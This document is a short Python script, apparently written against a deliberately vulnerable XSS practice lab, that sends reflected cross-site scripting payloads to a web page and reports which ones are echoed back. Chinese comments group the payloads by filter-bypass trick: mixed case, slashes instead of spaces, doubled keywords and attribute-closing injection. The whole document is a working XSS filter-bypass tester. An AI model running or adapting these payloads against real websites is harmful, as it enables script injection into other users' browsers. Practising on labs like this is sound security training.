import requests

url = "https://f0012fbf98204f57ae3bbf2cb76c8bce--8081.ap-shanghai2.cloudstudio.club/vul/xss/xss_reflected_get.php"

payload_list = [
    #大小写绕过
    '<IMG SRC=x OnError=alert(1)>',
    '<SvG OnLoad=alert(1)>',
    # /代替空格
    '<img/src=x/onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    #双写绕过
    '<scrscriptipt>alert(1)</scrscriptipt>',
    '<imimgg src=x onerror=alert(1)>',
    #属性闭合注入
    '"onmouseover=alert(1)//',
    "'onmouseover=alert(1)//",
    '"onclick=alert(1)//'
]

for pay in payload_list:
    res = requests.get(url, params={
        "message": pay,
        "submit": "submit"
    }, timeout=10)

    if pay in res.text:
        print(f"✅回显成功：{pay}")
    else:
        print(f"❌被过滤：{pay}")
